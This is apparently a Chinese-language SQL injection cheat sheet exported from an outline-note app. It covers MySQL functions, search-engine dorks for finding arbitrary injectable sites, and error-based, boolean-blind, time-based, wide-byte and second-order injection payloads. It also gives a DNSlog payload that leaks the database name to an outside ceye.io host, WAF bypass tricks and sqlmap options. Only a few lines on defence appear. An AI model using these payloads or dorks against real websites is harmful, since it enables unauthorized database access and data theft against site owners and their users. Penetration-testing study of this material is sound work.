系统自带库

```
information_schema
```

存放表名和库名的对应
```
information_schema.tables
```

存放字段名表名的对应

```
information_schema.columns
```

imit的用法imit的使用格式为 limit m,n，其中m是指记录开始的位置，从O开始，表示第一条记录；n是指取n条记录。例如 limit o，1表示从第一条记录开始，取一条记录，不使用 limit和使用 limit查询的结果如图4-4和图4-5所示，可以很明显地看出二者的区别。

|        函数名        |                        介绍                         |
| :------------------: | :-------------------------------------------------: |
|    system_user()     |                     系统用户名                      |
|        user()        |                       用户名                        |
|    current_user()    |                     当前用户名                      |
|    session_user()    |               链接当前数据库的用户名                |
|      @@datadir       |                     数据库路径                      |
|      @@basedir       |                   数据库安装路径                    |
| @@version_compile_os |                      操作系统                       |
|       count()        |                 返回执行结果的数量                  |
|       concat()       |               没有分隔符的连接字符串                |
|     concat_ws()      |               含有分隔符的连接字符串                |
|    group_concat()    |     连接一个组的所有字符串，以逗号分开每条数据      |
|     load_file()      |                    读取本地文件                     |
|     into outfile     |                       写文件                        |
|       ascii()        |                 字符串的ASCII代码值                 |
|        ord()         |         返回字符串的第一个字符的ASCII代码值         |
|        mid()         |               返回一个字符串的一部分                |
|       substr()       |               返回一个字符串的一部分                |
|       length()       |                  返回字符串的长度                   |
|        left()        |             返回字符串最左面的几个字符              |
|       floor()        |              返回小于或等于X的最大整数              |
|        char()        |          返回整数ASCII代码字符组成的字符串          |
|       strcmp()       |                   比较字符串内容                    |
|       ifnull()       | 加入参数1部位NULL，则返回为参数1，否则返回值为参数2 |
|        exp()         |                    返回e的x次方                     |

26、sleep()让此语句运行N秒钟

27、if() SELECT IF(1>2,2,3) ; -->3

28、char()返回整数ASCII代码字符组成的字符串

29、strcmp()比较字符串内容

30、ifnull() 假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2

31exp()返回e的x次方



二、目标搜集

1、无特定目标：inurl:.php?id=

2、有特定目标：inurl:php?id= site:

3、工具爬取：spider,对搜索引擎和目标网站的链接进行爬取



三、注入识别

1、手工简单识别:

'

and 1=1/and 1=2

and '1'='1/and '1'='2

and 1like 1/and 1like 2

2、工具识别：

sqlmap -m filename(filename中保存检测目标)

sqlmap --crawl(sqlmap对目标网站进行爬取，然后一次进行测试)

3、高级识别

扩展识别广度和深度:

SqlMap --level 增加测试级别，对header中相关参数也进行测试

sqlmap -r filename(filename中为网站请求数据)

利用工具识别提高效率

BurpSuite+Sqlmap

BurpSuite拦截所有浏览器访问提交的数据

BurpSuite扩展插件，直接调用SqlMap进行测试一些Tips

可以在参数后键入"*"来确定想要测试的参数

可能出现的点：新闻、登录、搜索、留言

站在开发的角度去寻找



四、报错注入方法

1、floor() :select count(*) from information_schema.tables group by concat((select

2、version()),floor(rand(0)*2));https://github.com/ADOOO/Dnslogsqlinj

3、group by会对rand()函数进行操作时产生错误

4、concat:连接字符串功能

5、floor:取float的整数值

6、rand:取0~1之间随机浮点值

7、group by:根据一个或多个列对结果集进行分组并有排序功能

8、extractvalue():extractvalue(1,concat(0x7e,(select user()),0x7e));

9、updatexml():select updatexml(1,concat(0x7e,(select user()),0x7e),1);



五、布尔盲注

1、left()函数

left(database(),1)>'s'

database()显示数据库名称,leȨ(a,b)从左侧截取a的前b位

2、regexp

select user() regexp'^r'

正则表达式的用法user()结果为root,regexp为匹配root的正则表达式

3、like

select user() like'^ro%'

与regexp类似，使用like进行匹配

4、substr()函数 ascii()函数

substr()函数 ascii(substr((select database()),1,1))<>98

substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii值

5、ord()函数 mid()函数

ord(mid((select user()),1,1))=114

mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii(),将字符转为ascii值



六、时间盲注

if(left(user(),1)='a',0,sleep(3));



七、DNSlog注入

SELECT LOAD_FILE(CONCAT('\\\\',select database(),'.mysql.r4ourp.ceye.io\\abc'));



八、宽字节注入

1、在注入点后键入%df,然后按照正常的诸如流程开始注入

2、黑盒测试：

在可能的注入点后键入%df,之后进行注入测试

3、白盒测试：

查看MySql编码是否为GBK

是否使用preg_replace把单引号替换成\'

是否使用addslashes进行转义

是否使用mysql_real_escape_string进行转义

4、防止宽字节注入

使用utf-8,避免宽字节注入

ps:不仅在gbk,韩文、日文等等都是宽字节，都很有可能存在宽字节注入漏洞

mysql_real_escape_string,mysql_set_charset('gbk',$conn);

设置参数，character_set_client=binary



九、二次编码

1、在注入点后键入%2527,然后按照正常的注入流程开始注入

2、黑盒测试：

在可能的注入点后键入%2527,之后进行注入测试

3、白盒测试

是否使用urldecode函数

urldecode函数是否存在转义方法之后



十、二次注入

1、插入恶意数据

第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，再写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。

2、引用恶意数据

在将数据存入到数据库之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了而已数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。

3、二次注入防御：

对外部提交的数据，需要更加谨慎的对待。

程序内部的数据调用，也要严格的进行检查，一旦不小心，测试者就能将特定了SQL语句带入到查询当中。



十一、WAF绕过

熟练掌握MySQL函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=随心所欲的绕过WAF的保护

1、白盒绕过

使用了blacklist函数过滤了'or'和'AND'

大小写变形:Or,OR,oR

等价替换：and->&&,or->||

2、黑盒绕过

寻找源站->针对云WAF

利用同网段->绕过WAF防护区域

利用边界漏洞->绕过WAF防护区域

资源限制角度绕过WAF

POST大BODY

请求方式变换GET->POST

Content-Type变换：application/x-www-form-urlencoded;->multipart/form-data;

参数污染

SQL注释符绕过

Level-1:union/**/select

Level-2:union/*aaaa%01bbs*/select

Level-3:union/*aaaaaaaaaaaaaaaaaaaaaaa*/select

内联注释:/*!xxx*/

空白符绕过

MySQL空白符：%09,%0A,%0B,%0D,%20,%0C,%A0,/*XXX*/

正则的空白符:%09,%0A,%0B,%0D,%20

Example-1:union%250Cselect

Example-2:union%25A0select

concat%2520(

concat/**/(

concat%250c(http://127.0.0.1/Less/?id=1

concat%25a0(

浮点数词法解析

select * from users where id=8E0union select 1,2,3

select * from users where id=8.0union select 1,2,3

select * from users where id=\Nunion select 1,2,3

extractvalue(1.concat(0x5c,md5(3)));

updatexml(1,concat(0x5d,md5(3))),1);

GeometryCollection((select*from(select@@version)f)x))

polygon((select*from(select name_const(version(),1))x))

linestring()

multipoint()

multilinestring()

multipolygon()

MySQL特殊语法

select{x table_name}from{x information_schema.tables};

3、Fuzz绕过

注释符绕过

最基本的:union/**/select

中间引入特殊字:union/*aaa%0abbs*/select

最后测试注释长度:union/*aaaaaaaaaaaaaaa*/select

最基本的模式:union/*something*/select

a1%!%2f



十二、sqlmap的conf

sqlmap.py -v3(主函数入口)

--user-agent=websecurity(请求扩充)

--threads=5(访问优化)

-p id注入配置

--level 3（检测配置）

--technique=E(注入技术)

--current-user(信息获取)

--flush-session（通用设置）

--beep(杂项)幕布 - 极简大纲笔记 | 一键生成思维导图